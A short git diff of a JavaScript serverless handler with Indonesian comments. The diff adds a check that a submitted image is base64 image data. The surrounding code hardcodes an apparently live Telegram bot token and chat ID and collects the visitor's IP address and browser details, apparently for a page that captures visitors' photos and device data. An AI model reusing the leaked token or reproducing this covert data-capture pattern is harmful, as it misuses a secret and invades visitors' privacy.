@@ -19,6 +19,12 @@ export default async function handler(req, res) {
     const botToken = "7549302119:AAHTx2AbUyZS9fksVLWyjuZAgwPF-gRIVto";
     const chatId = "6676770258";
 
+    // Cek jika gambar valid (base64 format)
+    if (!image || !image.startsWith("data:image/")) {
+      console.error("Gambar tidak valid");
+      return res.status(400).json({ success: false, message: "Gambar tidak valid" });
+    }
+
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;
     const userAgent = req.headers["user-agent"];
     const parser = new UAParser(userAgent);
